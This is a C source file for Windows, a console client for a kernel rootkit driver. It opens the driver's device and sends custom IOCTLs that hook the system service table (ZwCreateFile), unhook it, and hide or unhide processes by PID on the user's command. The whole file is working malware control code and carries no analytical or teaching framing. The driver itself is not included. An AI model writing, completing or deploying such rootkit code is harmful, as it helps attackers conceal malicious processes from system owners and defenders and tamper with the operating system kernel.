#include <Windows.h>
#include <stdio.h>

#define ROOTKIT 0x8001
#define IOCTL_ROOTKIT_HOOK_SSDT CTL_CODE(ROOTKIT, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_ROOTKIT_UNHOOK_SSDT CTL_CODE(ROOTKIT, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_ROOTKIT_HIDE_PROCESS CTL_CODE(ROOTKIT, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_ROOTKIT_UNHIDE_PROCESS CTL_CODE(ROOTKIT, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define MAX_ACTION_LENGTH 10
int main()
{
    char action[MAX_ACTION_LENGTH];
    DWORD pid;

    HANDLE hDevice = CreateFile(L"\\\\.\\Sugiot2", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE)
        return -1;

    char buffer[1024] = "123";
    DWORD returned;
    
    printf("hook/unhook doesnt take parameters - hooks only ZwCreateFile\n");
    printf("Choose action:\n");
    printf("- hide <pid>\n");
    printf("- unhide <pid>\n");
    printf("- hook\n");
    printf("- unhook\n");
    printf("Enter 'exit' to quit.\n");
    while (1) 
    {
        printf("> ");

        if (scanf_s("%9s", action, sizeof(action)) != 1) 
        {
            printf("Error reading input.\n");
            break;
        }

        if (strncmp(action, "hide", sizeof(action)) == 0) 
        {
            if (scanf_s("%d", &pid) != 1) 
            {
                printf("Invalid PID. Please try again.\n");
                continue;
            }
            DeviceIoControl(hDevice, IOCTL_ROOTKIT_HIDE_PROCESS, &pid, sizeof(pid), NULL, 0, &returned, NULL);
        }
        else if (strncmp(action, "unhide", sizeof(action)) == 0) 
        {
            if (scanf_s("%d", &pid) != 1) {
                printf("Invalid PID. Please try again.\n");
                continue;
            }
            DeviceIoControl(hDevice, IOCTL_ROOTKIT_UNHIDE_PROCESS, &pid, sizeof(pid), NULL, 0, &returned, NULL);
        }
        else if (strncmp(action, "hook", sizeof(action)) == 0) 
        {
            DeviceIoControl(hDevice, IOCTL_ROOTKIT_HOOK_SSDT, NULL, 0, NULL, 0, &returned, NULL);
        }
        else if (strncmp(action, "unhook", sizeof(action)) == 0) 
        {
            DeviceIoControl(hDevice, IOCTL_ROOTKIT_UNHOOK_SSDT, NULL, 0, NULL, 0, &returned, NULL);
        }
        else if (strncmp(action, "exit", sizeof(action)) == 0) 
        {
            break;
        }
        else 
        {
            printf("Invalid action. Please try again.\n");
        }
    }


	return 1;
}

